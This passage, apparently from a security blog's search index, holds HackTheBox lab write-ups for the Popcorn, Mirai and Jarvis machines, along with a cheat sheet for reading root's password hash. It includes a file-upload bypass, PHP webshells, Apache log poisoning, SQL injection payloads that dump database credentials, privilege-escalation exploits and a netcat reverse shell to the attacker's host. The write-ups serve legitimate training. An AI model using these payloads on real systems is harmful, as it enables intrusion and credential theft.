filename=../../../../../../../../var/www/torrent/torrents/0a6d9ecd5140c68d05343c711de65ab7f23cf81e.btf&amp;amp;newfilename=../../../../../../../../var/www/webshell.php Unfortunately, webshell.torrent did not contain any PHP code or our webshell.TCP/80 (HTTP) - File Upload Bypass on Torrent Host After skimming through torrenthost, there is a function that allow users to insert an image to display on their torrent. # Browse -&amp;gt; Select Webshell.php -&amp;gt; Edit This Torrent After some testing, .jpg, .png files are allowed .php, Invalid File How do we bypass the file upload restriction? Change the file extension .php -&amp;gt; .png Change Content-Type Add a Magic Header GIF89a Upload php-reverse-shell.php and bypass the restriction # Payload ------WebKitFormBoundary2SsVFwbzBBilUqZy Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;php-reverse-shell.png&quot; Content-Type: image/png Next, we have to find out where is php-reverse-shell.png stored It resides in upload/ Notice the Last modified date. Move it to /var/www w/ rename/index.php Start listener ┌──(root💀kali)-[~/htb/popcorn/10.10.10.6/exploit] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Invoke reverse shell at /var/www/shell.php ┌──(root💀kali)-[~/htb/popcorn] └─# curl http://popcorn.htb/shell.php Demo - Bypass restriction to upload webshell Privilege Escalation - 1Root - MOTD Found something interesting in george home directory www-data@popcorn:/home/george$ find . . ./.bash_logout ./.bashrc ./torrenthoster.zip ./.cache ./.cache/motd.legal-displayed ./.sudo_as_admin_successful ./user.txt ./.nano_history ./.mysql_history ./.bash_history ./.profile motd.legal-displayed What is motd.legal-displayed MOTD is the abbreviation of “Message Of The Day”, and it is used to display a message when a remote user login to the Linux Operating system using SSH. Search exploits for motd Exploit Title Path Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (1) linux/local/14273.sh Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2) linux/local/14339.sh How does pam_motd exploit work? pam_motd (aka the MOTD module) in libpam-modules before 1.1.0-2ubuntu1.1 in PAM on Ubuntu 9.10 and libpam-modules before 1.1.1-2ubuntu5 in PAM on Ubuntu 10.04 LTS Allows local users to change the ownership of arbitrary files via a symlink attack on .cache in a user’s home directory, related to “user file stamps” and the motd.legal-notice file. Check pam version www-data@popcorn:/home/george$ dpkg -l | grep pam ii libpam-modules 1.1.0-2ubuntu1 Pluggable Authentication Modules for PAM ii libpam-runtime 1.1.0-2ubuntu1 Runtime support for the PAM library ii libpam0g 1.1.0-2ubuntu1 Pluggable Authentication Modules library 1.1.0 Try linux/local/14339.sh, Transfer 14339.sh to popcorn.htb Change permissions www-data@popcorn:/tmp$ chmod +x 14339.sh Exploit! www-data@popcorn:/tmp$ bash 14339.sh [*] Ubuntu PAM MOTD local root [*] Backuped /var/www/.ssh/authorized_keys [*] SSH key set up [*] Backuped /var/www/.cache [*] spawn ssh [+] owned: /etc/passwd [*] spawn ssh [+] owned: /etc/shadow [*] Restored /var/www/.cache [*] Restored /var/www/.ssh/authorized_keys [*] SSH key removed [+] Success! Use password toor to get root Password: root@popcorn:/tmp# id;whoami uid=0(root) gid=0(root) groups=0(root) root root@popcorn:/tmp# Privilege Escalation - 2Root - Kernel Exploit (Dirty c0w) Identify kernel version www-data@popcorn:/home/george$ uname -a Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux www-data@popcorn:/home/george$ 2.6.31 - susceptible to dirtyc0w kernel exploit Try dirtyc0w exploit Download dirty.c Transfer to popcorn.htb www-data@popcorn:/tmp$ wget 10.10.14.14/dirty.c --2022-09-18 13:26:39-- http://10.10.14.14/dirty.c Compile dirty.c www-data@popcorn:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt www-data@popcorn:/tmp$ chmod +x dirty Exploit www-data@popcorn:/tmp$ ./dirty password /etc/passwd successfully backed up to /tmp/passwd.bak Please enter the new password: password Complete line: firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash mmap: b78a6000 Switch to firefart (root) www-data@popcorn:/tmp$ su firefart Password: firefart@popcorn:/tmp# id;whoami uid=0(firefart) gid=0(root) groups=0(root) firefart firefart@popcorn:/tmp# OR SSH w/ firefart:password ┌──(root💀kali)-[~/htb/popcorn/10.10.10.6/exploit] └─# sshpass -p &#39;password&#39; ssh firefart@popcorn.htb AdditionalLFI2RCE - Apache Log Files Earlier we tried to poison apache log files, it failed because user www-data has insufficient permissions, if we were to change permissions so that www-data can execute it, it would have worked. root@popcorn:/var/log# ls -la | grep apache2 drwxrw---- 2 root adm 4096 2022-09-18 14:55 apache2 root@popcorn:/var/log/apache2# ls -la /var/log/apache2/access.log -rw-r----- 1 root adm 398300 2022-09-18 14:21 /var/log/apache2/access.log Change permissions root@popcorn:/var/log/apache2# chown -R www-data:www-data apache2/ root@popcorn:/var/log# ls -la | grep apache2 drwxrw---- 2 www-data www-data 4096 2022-09-18 15:21 apache2 Poison apache logs ┌──(root💀kali)-[~/htb/popcorn/10.10.10.6/loot] └─# curl &quot;http://popcorn.htb/&quot; -H &quot;User-Agent: &amp;lt;?php system(\\$_GET[&#39;c&#39;]); ?&amp;gt;&quot; &amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;It works!&amp;lt;/h1&amp;gt; &amp;lt;p&amp;gt;This is the default web page for this server.&amp;lt;/p&amp;gt; &amp;lt;p&amp;gt;The web server software is running but no content has been added, yet.&amp;lt;/p&amp;gt; &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; Move /var/log/apache2/access.log to /var/www/log.php # Payload filename=/var/log/apache2/access.log&amp;amp;newfilename=/var/www/log.php The same can be done for SSH Log poisoning Demo - LFI2RCE Apache log file poisoning " }, { "title": "HackTheBox - Unlock Password Protected Post", "url": "/posts/Unlock-Post/", "categories": "Cheatsheet", "tags": "", "date": "2022-09-18 00:00:00 +0800", "snippet": "Linux Once you rooted the machine, have access root user Obtain root’s hashed password root@rooted-box:~# cat /etc/shadow | grep root | cut -d &quot;:&quot; -f2 $y$j9T$zJMiBXFlQaVLqD8B7hPR3.$ceN5vvW/KTMQ.YeNjqT8UVo6TsKm/Dl8P1uefK6v5A1 Enter the hash to unlock the post." }, { "title": "HackTheBox - Mirai", "url": "/posts/Mirai/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "data-recovery", "date": "2022-09-17 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a DNS enumeration, revealing a domain name raspberrypi.local, suggestings that our target could be running raspberry pi OS. After some web enumeration, there is a pi-hole running on port 80 and Plex Media Server running on port 43400, but both are rabbit-holes. Simply SSH w/ raspberry pi OS’s default credentials pi:raspberrypi, allowing us to obtain a low-privilege/pi user.For privilege escalation, user pi is able to run any commands as root, allowing us to privilege escalate to root w/ su. However, there are additional steps to do to obtain root.txt, root.txt is stored in removable drive /dev/sdb, upon finding that removable drive, root.txt is deleted. After analyzing the removable drive w/ strings &amp;amp; xxd, the contents of root.txt is stored in its memory. Column Details Box Name Mirai IP 10.10.10.48 Points 20 Difficulty Easy Creator Arrexel Release Date 01 Sep 2017 ReconTCP/5353 Zone Transfer ┌──(root💀kali)-[~/htb/mirai] └─# dig -x 10.10.10.48 @mirai.htb -p 5353 ; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.18.0-2-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; -x 10.10.10.48 @mirai.htb -p 5353 ;; global options: +cmd ;; Got answer: ;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 9514 ;; flags: qr aa; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;48.10.10.10.in-addr.arpa. IN PTR ;; ANSWER SECTION: 48.10.10.10.in-addr.arpa. 10 IN PTR raspberrypi.local. ;; Query time: 39 msec ;; SERVER: 10.10.10.48#5353(mirai.htb) (UDP) ;; WHEN: Fri Sep 16 03:27:56 +08 2022 ;; MSG SIZE rcvd: 73 raspberrypi.local TCP/80 (HTTP) FFUF ┌──(root💀kali)-[~/htb/mirai] └─# ffuf -u http://raspberrypi.local/FUZZ -w /usr/share/wordlists/dirb/common.txt -fw 400,2 admin [Status: 301, Size: 0, Words: 1, Lines: 1] swfobject.js [Status: 200, Size: 61, Words: 10, Lines: 2] admin swfobject.js TCP/43400 (HTTP) FFUF ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/loot] └─# ffuf -u http://10.10.10.48:32400/FUZZ -w /usr/share/wordlists/dirb/common.txt -fw 2,5 crossdomain.xml [Status: 200, Size: 347, Words: 16, Lines: 7] favicon.ico [Status: 200, Size: 5430, Words: 25, Lines: 14] identity [Status: 200, Size: 175, Words: 6, Lines: 4] manage [Status: 301, Size: 0, Words: 1, Lines: 1] web [Status: 301, Size: 0, Words: 1, Lines: 1] :: Progress: [4615/4615] :: Job [1/1] :: 1037 req/sec :: Duration: [0:00:06] :: Errors: 0 :: Initial FootholdTCP/80 (HTTP) - Pi-Hole v3.1.4 Found pi-hole v3.1.4 login page Search exploits for pi-hole v3.1.4 Exploit Title Path Pi-hole &amp;lt; 4.4 - Authenticated Remote Code Execution linux/webapps/48442.py Pi-hole &amp;lt; 4.4 - Authenticated Remote Code Execution / Privileges Escalation linux/webapps/48443.py We must be authenticated first. I tried to further enumerate the web directory for files that contain credentials, failed. ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/loot] └─# ffuf -u http://10.10.10.48/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e &#39;.txt&#39; -fw 1,0,5 TCP/43400 (HTTP) - Plex Media Server Found Plex Media Server login page, version unknown Search exploits for Plex Media Server Exploit Title Path Plex Media Server 0.9.9.2.374-aa23a69 - Multiple Vulnerabilities multiple/webapps/31983.txt Tried some of the POC, did not work.TCP/22 (SSH) - Default Credentials Earlier, we enumerated a domain name, raspberrypi.local, is a hint that the target could be running raspberry pi OS. By default, raspberry pi login details are pi:raspberry SSH w/ pi:raspberry ┌──(root💀kali)-[~/htb/mirai] └─# sshpass -p &quot;raspberry&quot; ssh pi@raspberrypi.local Privilege EscalationRoot - Via SUDO Check sudo access for user pi pi@raspberrypi:~ $ sudo -l Matching Defaults entries for pi on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User pi may run the following commands on localhost: (ALL : ALL) ALL (ALL) NOPASSWD: ALL Able to run all commands as root Privilege escalate w/ su pi@raspberrypi:~ $ sudo su root@raspberrypi:/home/pi# id;whoami uid=0(root) gid=0(root) groups=0(root) root Where is Root.txt? View contents of root.txt root@raspberrypi:~# cat root.txt I lost my original root.txt! I think I may have a backup on my USB stick... Enumerate mounts in system root@raspberrypi:~# cat /etc/fstab # UNCONFIGURED FSTAB FOR BASE SYSTEM aufs / aufs rw 0 0 tmpfs /tmp tmpfs nosuid,nodev 0 0 /dev/sdb /media/usbstick ext4 ro,suid,dev,noexec,auto,user,async 0 0 root@raspberrypi:~# mount | grep stick /dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data=ordered) root@raspberrypi:~# df -h | grep stick /dev/sdb 8.7M 93K 7.9M 2% /media/usbstick /dev/sdb usbstick - ext4 View files in /media/usbstick root@raspberrypi:/media/usbstick# ls -la total 18 drwxr-xr-x 3 root root 1024 Aug 14 2017 . drwxr-xr-x 8 root root 4096 Sep 16 12:52 .. -rw-r--r-- 1 root root 129 Aug 14 2017 damnit.txt drwx------ 2 root root 12288 Aug 14 2017 lost+found root@raspberrypi:/media/usbstick# cat damnit.txt Damnit! Sorry man I accidentally deleted your files off the USB stick. Do you know if there is any way to get them back? -James Recovering Root.txt View /dev/sdb w/ xxd a hexeditor root@raspberrypi:/media# xxd &quot;/dev/sdb&quot; | grep -v &quot;0000 0000 0000 0000 0000 0000 0000 0000&quot; Found contents root.txt root@raspberrypi:/media# xxd &quot;/dev/sdb&quot; | grep -P &quot;[a-z0-9]{16}&quot; | grep -P &quot;[a-z0-9]{16}&quot; | awk &#39;{print $NF}&#39; | sed -z &#39;s/\\n//g&#39; 3d3e483143ff12ec505d026fa13e020 View /dev/sdb w/ strings root@raspberrypi:/media# strings &quot;/dev/sdb&quot; | grep -P &quot;[a-z0-9]{32}&quot; 3d3e483143ff12ec505d026fa13e020b Recovering Root.txt w/ testdisk - Failed Recover the deleted file w/ testdisk testdisk - is a free and open-source data recovery utility that helps users recover lost partitions or repair corrupted filesystems. Install testdisk on mirai.htb Download testdisk Transfer to mirai.htb root@raspberrypi:/tmp/testdisk# wget 10.10.14.14:9090/testdisk-7.2-WIP.linux26.tar.bz2 Unzip root@raspberrypi:/tmp/testdisk# tar -xf testdisk-7.2-WIP.linux26.tar.bz2 Copy testdisk_static into /usr/local/sbin root@raspberrypi:/tmp/testdisk/testdisk-7.2-WIP# cp testdisk_static /usr/local/sbin/testdisk Make testdisk executable root@raspberrypi:/tmp/testdisk/testdisk-7.2-WIP# chmod +x /usr/local/sbin/testdisk Attempt to recover the deleted file w/ testdisk Execute testdisk, root@raspberrypi:/tmp/testdisk/testdisk-7.2-WIP# sudo testdisk # Use arrow keys to navigate # Enter to select Create a new log file Select /dev/sdb Select None Select ext4, LIST Copy root.txt # Navigate to root &#39;c&#39; to copy Move to /tmp to paste w/ SHIFT+C View root.txt - empty root@raspberrypi:/tmp# cat root.txt root@raspberrypi:/tmp# wc -c root.txt 0 root.txt Recovering Root.txt w/ photorec - Failed Recover the deleted file w/ photorec photorec - is a free and open-source utility software for data recovery with text-based user interface using data carving techniques, designed to recover lost files from various digital camera memory, hard disk and CD-ROM. Install photorec on mirai.htb Download testdisk Transfer to mirai.htb root@raspberrypi:/tmp/testdisk# wget 10.10.14.14:9090/testdisk-7.2-WIP.linux26.tar.bz2 Unzip root@raspberrypi:/tmp/testdisk# tar -xf testdisk-7.2-WIP.linux26.tar.bz2 Copy photorec_static into /usr/local/sbin root@raspberrypi:/tmp/testdisk/testdisk-7.2-WIP# cp photorec_static /usr/local/sbin/photorec Make testdisk executable root@raspberrypi:/tmp/testdisk/testdisk-7.2-WIP# chmod +x /usr/local/sbin/photorec Attempt to recover the deleted file w/ photorec Execute photorec root@raspberrypi:/tmp/testdisk/testdisk-7.2-WIP# sudo photorec # Use arrow keys to navigate # Enter to select Select /dev/sdb Select UNKNOWN - WHOLE DISK Select ext2/ext3 Select directory to save the recovered file, browse to /tmp # SHIFT + C to select directory View files in recup_dir.1, failed root@raspberrypi:/tmp/recup_dir.1# ls -la total 8 drwxr-xr-x 2 root root 80 Sep 16 15:45 . drwxrwxrwt 15 root root 400 Sep 16 15:45 .. -rw-r--r-- 1 root root 129 Sep 16 15:45 f0016470.txt -rw-r--r-- 1 root root 3175 Sep 16 15:45 report.xml root@raspberrypi:/tmp/recup_dir.1# cat f0016470.txt Damnit! Sorry man I accidentally deleted your files off the USB stick. Do you know if there is any way to get them back? -James root@raspberrypi:/tmp/recup_dir.1# Recovering Root.txt w/ extundelete Recover the deleted file w/ extundelete extundelete - is a utility that can recover deleted files from an ext3 or ext4 partition. Tried to install extundelete on mirai.htb, failed Install extundelete on kali Download extundelete ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete] └─# wget https://onboardcloud.dl.sourceforge.net/project/extundelete/extundelete/0.2.4/extundelete-0.2.4.tar.bz2 Unzip ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete] └─# tar -xf extundelete-0.2.4.tar.bz2 Install prerequisite library ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete/extundelete-0.2.4] └─# sudo apt-get install e2fslibs-dev Compile extundelete ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete/extundelete-0.2.4] └─# chmod +x configure ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete/extundelete-0.2.4] └─# ./configure Configuring extundelete 0.2.4 Writing generated files to disk ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete/extundelete-0.2.4] └─# make make -s all-recursive Making all in src insertionops.cc: In function ‘std::ostream&amp;amp; operator&amp;lt;&amp;lt;(std::ostream&amp;amp;, const ext2_inode&amp;amp;)’: insertionops.cc:36:36: error: ‘const struct ext2_inode’ has no member named ‘i_dir_acl’; did you mean ‘i_file_acl’? 36 | os &amp;lt;&amp;lt; &quot;Directory ACL: &quot; &amp;lt;&amp;lt; inode.i_dir_acl &amp;lt;&amp;lt; std::endl; | ^~~~~~~~~ | i_file_acl make[2]: *** [Makefile:437: extundelete-insertionops.o] Error 1 make[1]: *** [Makefile:268: all-recursive] Error 1 Fix Errors - Followed this guide ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete/extundelete-0.2.4] └─# wget https://sourceforge.net/p/extundelete/tickets/5/attachment/extundelete-0.2.4-e2fsprogs.patch.txt ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete/extundelete-0.2.4] └─# patch -p1&amp;lt;extundelete-0.2.4-e2fsprogs.patch.txt patching file src/insertionops.cc Compile again ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete/extundelete-0.2.4] └─# ./configure Configuring extundelete 0.2.4 Writing generated files to disk ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete/extundelete-0.2.4] └─# make &amp;amp; make install [1] 518198 make -s all-recursive Making install in src Making all in src /usr/bin/install -c extundelete &#39;/usr/local/bin&#39; Transfer /dev/sdb to kali Create archive of dev/sdb root@raspberrypi:/tmp# sudo dcfldd if=/dev/sdb | gzip -1 - | dcfldd of=usbstick.gz 256 blocks (8Mb) written. 320+0 records in 320+0 records out 0+3 records in 1+1 records out Transfer &amp;amp; Extract on kali ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/loot] └─# wget mirai.htb:9090/usbstick.gz ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/loot] └─# gzip -d usbstick.gz ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/loot] └─# file usbstick usbstick: Linux rev 1.0 ext4 filesystem data, UUID=635bcd7f-1d95-4229-bf13-3e722026db3c (extents) (huge files) Attempt to recover the deleted file w/ extundelete Attempt to restore everything on the filesystem ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/loot] └─# extundelete --restore-all usbstick NOTICE: Extended attributes are not restored. Loading filesystem metadata ... 2 groups loaded. Loading journal descriptors ... 23 descriptors loaded. Searching for recoverable inodes in directory / ... 1 recoverable inodes found. Looking through the directory structure for deleted files ... 0 recoverable inodes still lost. View recovered files ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/loot] └─# cd RECOVERED_FILES/ ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/loot/RECOVERED_FILES] └─# ls root.txt ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/loot/RECOVERED_FILES] └─# cat root.txt 3d3e483143ff12ec505d026fa13e020b " }, { "title": "HackTheBox - Jarvis", "url": "/posts/Jarvis/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "linux-priv-esc/suid/gtfo-bin, exploit/sqli/webshell, exploit/sqli/database-enum, exploit/command-injection, exploit/sqli/rce", "date": "2022-09-15 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a webpage enumeration, a vulnerable GET parameter ?cod= is susceptible to SQLi, through the SQLi, we are able to extract DBMS user DBadmin’s hash, and crack it w/ hashcat. Next, we are able to insert a web shell through phpmyadmin portal, allowing us to obtain a low-privilege/www-data shell.For privilege escalation, we have to privilege escalate twice, once to pepper and then to root. User www-data has a sudoers entry that allows www-data to execute simpler.py as pepper. After analyzing the source code of simpler.py it is susceptible to command injection due to insufficient input sanitization (some characters were missed out /$(), allowing us to privilege escalate to pepper via setuid on bash.After more enumeration, there is a binary called systemctl that has root SUID bit on it, systemctl has a GTFOBins entry, we are able to create a malicious service that will invoke a reverse shell when executing systemctl, privilege escalating us to root.If you wish to practice SQLi similar to this, try: Vulnhub DC9 Vulnhub NullByte 1 Vulnhub pWnOS 2.0 Vulnhub HackMe TryHackMe The Marketplace TryHackMe Game Zone HackTheBox Shared (Not Retired Yet) Column Details Box Name Jarvis IP 10.10.10.143 Points 30 Difficulty Medium Creator manulqwerty &amp;amp; Gh0spp7 Release Date 22 Jun 2019 ReconTCP/80 (HTTP) FFUF 301 GET 9l 28w 310c http://10.10.10.143/css =&amp;gt; http://10.10.10.143/css/ 301 GET 9l 28w 312c http://10.10.10.143/fonts =&amp;gt; http://10.10.10.143/fonts/ 200 GET 68l 167w 2237c http://10.10.10.143/footer.php 301 GET 9l 28w 313c http://10.10.10.143/images =&amp;gt; http://10.10.10.143/images/ 200 GET 543l 1653w 0c http://10.10.10.143/index.php 301 GET 9l 28w 309c http://10.10.10.143/js =&amp;gt; http://10.10.10.143/js/ 200 GET 43l 85w 1333c http://10.10.10.143/nav.php 301 GET 9l 28w 317c http://10.10.10.143/phpmyadmin =&amp;gt; http://10.10.10.143/phpmyadmin/ 302 GET 101l 231w 3024c http://10.10.10.143/room.php =&amp;gt; index.php 403 GET 11l 32w 300c http://10.10.10.143/server-status phpmyadmin. Nikto ┌──(root💀kali)-[~/htb/jarvis] └─# nikto -h http://jarvis.htb; Uncommon header &#39;ironwaf&#39; found, with contents: 2.0.3 ironwaf 2.0.3 TCP/64999 (HTTP) FFUF 200 GET 1l 11w 54c http://10.10.10.143:64999/index.html index.html CURL ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143] └─# curl jarvis.htb:64999 Hey you have been banned for 90 seconds, don&#39;t be bad ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143] └─# curl jarvis.htb:64999/asdf Hey you have been banned for 90 seconds, don&#39;t be bad Banned by WAF? Initial FootholdTCP/80 (HTTP) - GET parameter enumeration Tried to use default creds to login to phpmyadmin panel, failed Found something interesting after browsing the source code of jarvis.htb room.php?cod=1 Vulnerable to LFI/SQLi? Enumerate GET parameter ?cod=1 for LFI, failed ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/exploit] └─# ffuf -u http://10.10.10.143/room.php?cod=../../../../../FUZZ -w /usr/share/wordlists/LFI/file_inclusion_linux.txt -fw 308 ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/exploit] └─# ffuf -u http://10.10.10.143/room.php?cod=1../../../../../FUZZ -w /usr/share/wordlists/LFI/file_inclusion_linux.txt -fw 308 :: Progress: [2249/2249] :: Job [1/1] :: 728 req/sec :: Duration: [0:00:04] :: Errors: 0 :: Enumerate GET parameter ?cod=1 for SQLi w/ sqlmap, success! ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/exploit] └─# sqlmap -r sqli.txt -p cod --batch Parameter: cod (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: cod=1 AND 6949=6949 Type: time-based blind Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: cod=1 AND (SELECT 4379 FROM (SELECT(SLEEP(5)))EdRY) Type: UNION query Title: Generic UNION query (NULL) - 7 columns Payload: cod=-6596 UNION ALL SELECT CONCAT(0x71626b7871,0x556466584f47547078516c617275656c676b6f704d757175784e4868546a724d694f427061467451,0x71786b7171),NULL,NULL,NULL,NULL,NULL,NULL-- - TCP/80 (HTTP) - Manual SQLi Testing how room.php reacts to SQLi --------------------------------Payload------------------------------------ # Payload 1 1&#39; ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/loot] └─# curl -s &quot;jarvis.htb/room.php?cod=1&#39;&quot; | grep -oP &quot;room\\.php\\?cod\\=\\d&quot; Nothing displayed # Payload 2 1&quot; ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/loot] └─# curl -s &#39;jarvis.htb/room.php?cod=1&quot;&#39; | grep -oP &quot;room\\.php\\?cod\\=\\d&quot; Nothing displayed # Payload 3 1+1 1%2b1 ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/loot] └─# curl -s &#39;jarvis.htb/room.php?cod=1%2b1&#39; | grep -oP &quot;room\\.php\\?cod\\=\\d&quot; room.php?cod=2 # Payload 4 &#39;#&#39; ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/loot] └─# curl -s &#39;jarvis.htb/room.php?cod=1#&#39; | grep -oP &quot;room\\.php\\?cod\\=\\d&quot; room.php?cod=1 # Payload 5 &#39;-- -&#39; ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/loot] └─# curl -s &#39;jarvis.htb/room.php?cod=1--+-&#39; | grep -oP &quot;room\\.php\\?cod\\=\\d&quot; room.php?cod=1 ------------------------------Hypothesis------------------------------------ # Hypothesis, no quotes are used SELECT * FROM room WHERE id=$_GET[&quot;cod=1&quot;] # Syntax Error, because of unclosed quote `&#39;` SELECT * FROM room WHERE id=1&#39; # Syntax Error, because of unclosed quote `&quot;` SELECT * FROM room WHERE id=1&quot; # It works, valid SQL statement SELECT * FROM room WHERE id=1+1 # It works w/ or w/o the comments, it means there are no further SQL commands behind it, or the SQL commands behind does not affect our query. SELECT * FROM room WHERE id=1# SELECT * FROM room WHERE id=1-- - Determine number of columns w/ wfuzz ┌──(root💀kali)-[~/htb/jarvis] └─# wfuzz -c -z range,1-10 &quot;http://jarvis.htb/room.php?cod=1 order by FUZZ&quot; ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://jarvis.htb/room.php?cod=1%20order%20by%20FUZZ Total requests: 10 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000002: 200 190 L 466 W 6204 Ch &quot;2&quot; 000000007: 200 190 L 466 W 6204 Ch &quot;7&quot; 000000010: 200 189 L 443 W 5916 Ch &quot;10&quot; 000000008: 200 189 L 443 W 5916 Ch &quot;8&quot; 000000001: 200 190 L 466 W 6204 Ch &quot;1&quot; 000000003: 200 190 L 466 W 6204 Ch &quot;3&quot; 000000009: 200 189 L 443 W 5916 Ch &quot;9&quot; 000000005: 200 190 L 466 W 6204 Ch &quot;5&quot; 000000006: 200 190 L 466 W 6204 Ch &quot;6&quot; 000000004: 200 190 L 466 W 6204 Ch &quot;4&quot; Total time: 0 Processed Requests: 10 Filtered Requests: 0 Requests/sec.: 0 We can conclude that there are 7 columns ORDER BY 1-7 : 190 L ORDER BY 8-10: 189 L Determine number of columns w/ burp # Payload ORDER BY 7 ORDER BY 8 # Hypothesis SELECT * FROM hotel WHERE id = 1 ORDER BY 7 Determine reflected columns # Payload -1+UNION+SELECT+1,2,3,4,5,6,7 Determine all databases # Payload -1+UNION+SELECT+1,group_concat(&quot;database:&quot;,schema_name,&quot;\\n&quot;),3,4,5,6,7+FROM+information_schema.schemata Database: hotel information_schema mysql performance_schema Determine tables in hotel database # Payload -1+UNION+SELECT+1,group_concat(&quot;table:&quot;,table_name,&quot;\\n&quot;),3,4,5,6,7+FROM+information_schema.tables+WHERE+table_schema=&#39;hotel&#39; Database: hotel [1 Tables] room Determine columns in room table from hotel database # Payload -1+UNION+SELECT+1,group_concat(&quot;column:&quot;,column_name,&quot;\\n&quot;),3,4,5,6,7+FROM+information_schema.columns+WHERE+table_name=&#39;room&#39; Database: hotel Table: room [7 Columns] cod name price descrip star image mini Not useful Lets try to obtain a DBMS user to login to phpmyadmin Determine tables in mysql database # Payload -1+UNION+SELECT+1,group_concat(&quot;table:&quot;,table_name,&quot;\\n&quot;),3,4,5,6,7+FROM+information_schema.tables+WHERE+table_schema=&#39;mysql&#39; Database: mysql [1 Useful Table] user Determine columns in user table from mysql database # Payload -1+UNION+SELECT+1,group_concat(&quot;column:&quot;,column_name,&quot;\\n&quot;),3,4,5,6,7+FROM+information_schema.columns+WHERE+table_name=&#39;room&#39; Database: mysql Table: user [2 Useful Columns] User Password Dump entries from user table from mysql database # Payload-1+UNION+SELECT+1,group_concat(User,&#39;:&#39;,Password,&#39;\\n&#39;),3,4,5,6,7+FROM+mysql.user DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 Crack Hash Identify hash w/ name that hash Crack hash w/ hashcat ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/loot] └─# hashcat -a 0 -m 300 &#39;2D2B7A5E4E637B8FBA1D17F40318F277D29964D0&#39; /usr/share/wordlists/rockyou.txt --show 2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyou DBadmin:imissyou TCP/80 (HTTP) - SQLi2RCE, Insert Webshell w/ phpmyadmin Successfully login to phpmyadmin w/ DBadmin:imissyou Proceed to hotel -&amp;gt; SQL -&amp;gt; Insert Webshell SELECT &quot;&amp;lt;?php system($_GET[&#39;cmd&#39;]); ?&amp;gt;&quot; into outfile &quot;/var/www/html/shell.php&quot; Test http://jarvis.htb/shell.php # Payload ?cmd=id;whoami Invoke reverse shell ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/loot] └─# curl &#39;http://10.10.10.143/shell.php?cmd=nc+10.10.14.24+4444+-e+/bin/bash&#39; Demo - Insert webshell &amp;amp; RCE Initial Foothold - AlternativesObtain DBMS user Instead of enumerating the mysql database and extracting the username &amp;amp; hash, we use LOAD_FILE() function, to potentially include a file w/ credentials. Use TO_base64() to encode room.php, otherwise nothing will be displayed, similar to php://filter/convert.base64-encode/resource=&amp;lt;file&amp;gt;. Load Base64 encoded room.php # Payload -1%20UNION%20SELECT%201,TO_base64(LOAD_FILE(&#39;/etc/passwd&#39;)),3,4,5,6,7 Decode base64 encoded room.php ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/loot] └─# base64 -d room.php.b64 | head &amp;lt;?php error_reporting(0); if($_GET[&#39;cod&#39;]){ include(&quot;connection.php&quot;); include(&quot;roomobj.php&quot;); 